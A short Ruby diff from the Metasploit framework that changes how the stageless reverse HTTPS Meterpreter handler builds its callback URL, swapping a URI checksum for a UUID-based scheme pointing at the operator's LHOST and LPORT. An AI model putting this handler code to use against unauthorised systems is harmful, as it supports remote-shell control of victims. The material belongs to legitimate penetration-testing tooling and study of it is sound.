@@ -5,7 +5,7 @@
 
 require 'msf/core'
 require 'rex/parser/x509_certificate'
-require 'rex/payloads/meterpreter/uri_checksum'
+require 'msf/core/payload/uuid_options'
 
 module Msf
 
@@ -18,7 +18,7 @@ module Msf
 module Handler::ReverseHttp::Stageless
 
   include Msf::Payload::Windows::VerifySsl
-  include Rex::Payloads::Meterpreter::UriChecksum
+  include Msf::Payload::UUIDOptions
 
   def initialize_stageless
     register_options([
@@ -27,9 +27,7 @@ module Handler::ReverseHttp::Stageless
   end
 
   def generate_stageless(&block)
-    checksum = generate_uri_checksum(URI_CHECKSUM_CONN)
-    rand = Rex::Text.rand_text_alphanumeric(16)
-    url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}/#{checksum}_#{rand}/"
+    url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}#{generate_uri_uuid_mode(:connect)}/"
 
     unless block_given?
       raise ArgumentError, "Stageless generation requires a block argument"
